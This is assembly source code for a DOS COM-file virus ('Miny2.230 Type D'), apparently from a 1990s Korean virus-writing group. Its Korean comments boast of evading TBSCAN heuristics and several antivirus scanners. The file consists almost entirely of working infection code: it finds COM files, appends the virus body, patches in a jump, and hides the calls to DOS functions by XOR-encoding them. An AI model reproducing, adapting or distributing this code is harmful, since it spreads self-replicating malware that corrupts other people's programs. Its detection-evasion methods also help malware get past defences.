;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.230 Type D
; Author : Osiris
; Group : CVC
; Date : 1997/08/20
;
; Type : Non-resident COM infector
;
; Miny2 (Type C) 의 개선판이다.
;
; TBSCAN 의 인공지능 (훗~) 에 전혀 진단이 안된다. 단지 62초로 만들기 때문에 'T'
; 플래그만 방생한다. 그외 국내에서 많이 쓰이는 백신들에서는 검색이 전혀안된다.
; 단, 인공지능검색에는 진단이 된다. 이건 다음 버전에서 해결할 예정이다.
;
; 이버전에서는 TBSCAN 에서 Howard 로 진단되던 문제점과
; TBSCAN 의 인공지능에 걸리던 문제가 해결되었다.
;
; TBSCAN 의 F 플래그 '의심스러운 파일 억세스' 부분의 문제는
; 파일 관련 루틴들을 XOR 로 암호화 시켜서 따로 호출하게 만들었다.
; 여기서는 각 기능에 50h 로 XOR 연산을 시켜서 호출했다.
;
; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : 진단 x
;
; 여전히 문제점이라면 한개의 COM 감염과 (감염속도느림) EXE 형식의 COM 파일을 만
; 났을때의 감염정지이다. 물론 시간을 62초로 만들므로 다음에는 그냥 통과한다.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; 쓰레기값 (아무일도 안한다.)
            nop                         ; 앞부분 복구시 바이러스가 파괴되기
            nop                         ; 때문에 이 값을 넣었다.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            nop                         ; nop 을 빼버리면 'Howard' 로 진단
            sub   bp,offset Next        ; BP = 바이러스 시작지점

            lea   si,COM_head[BP]       ; COM 앞부분 복구
            mov   di,0FFh               ; DI 를 100h 로 잡아 버리면
            inc   di                    ;
            push  di                    ; TBSCAN 에서 'O' 상태가 발생한다.
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA 로 사용해 PSP 가 파괴되므로
            mov   si,0080h              ; 잠시 저장한다.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,(4Eh xor 50h)      ; 파일 찾기
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      call  Int21
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; 원래 DTA 복구
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; 감염 여부를 확인한다.
            mov   al,DS:[0096h]         ; 62 초 인지 검사한다.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,(4Fh xor 50h)      ; 다음 파일 찾기
            jmp   Find
 Infect:
            mov   ah,(43h XOR 50h)
            mov   al,01h                ; 읽기/쓰기 속성으로 바꿈
            xor   cx,cx
            mov   dx,009Eh
            call  Int21
            jc    Restart               ; 에러시 파일 닫기

            mov   ah,(3Dh xor 50h)
            mov   al,02h                ; 파일 오픈
            call  Int21
            jc    Restart

            xchg  ax,bx                 ; 파일 핸들 얻기

            mov   al,00
            mov   ah,(57h XOR 50h)      ; 파일 작성 시간 얻기
            call  Int21
            push  cx                    ; 작성 시간 저장
            push  dx                    ;

            mov   ah,(3Fh XOR 50h)      ; 앞부분 읽기
            lea   dx,COM_Head[BP]       ; 버퍼 주소
            mov   cx,0003               ; 3 바이트
            call  Int21
            cmp   byte ptr COM_Head[BP],'M' ; MZ 인가 ?
            jnz   lseek2
            cmp   byte ptr COM_Head[BP+1],'Z'
            jz    Error
 lseek2:
            mov   al,02                 ; 파일 끝으로 이동
            call  lseek
            or    dx,dx                 ; 64 KB 이상인가 ?
            jnz   Error                 ; 다음 검사때 오픈 시키지 않기위해서

            sub   ax,3                  ; 점프값 계산
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,(40h XOR 50h)      ; 바이러스 쓰기
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            call  int21

            mov   al,00                 ; 처음으로 이동
            call  lseek

            mov   ah,(40h xor 50h)      ; 점프 코드 쓰기
            mov   cx,0003
            lea   dx,JumpCode[BP]
            call  int21

 Error:
            pop   dx                    ; 파일 작성 시간 복구
            pop   cx                    ;
            or    cx,+1Fh               ; 62 초로 만들기
            mov   ah,(57h XOR 50h)
            mov   al,01h              ;
            call  Int21

 Close:
            mov   ah,(3Eh XOR 50h)      ; 파일 닫기
            call  Int21
            jmp   Restart

 lseek:                                 ;
            xor   cx,cx
            xor   dx,dx
            mov   ah,40h
            inc   ah
            inc   ah
            int   21h
            ret

 Int21:                                 ; XOR 50h 연산후
            xor   ah,50h                ; 인터럽트 21h 호출
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM 앞부분
 Match_COM  db    '*.c?m',00            ; COM 파일 찾기
            db    'Miny2'               ; 미니 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:
            END   Miny2

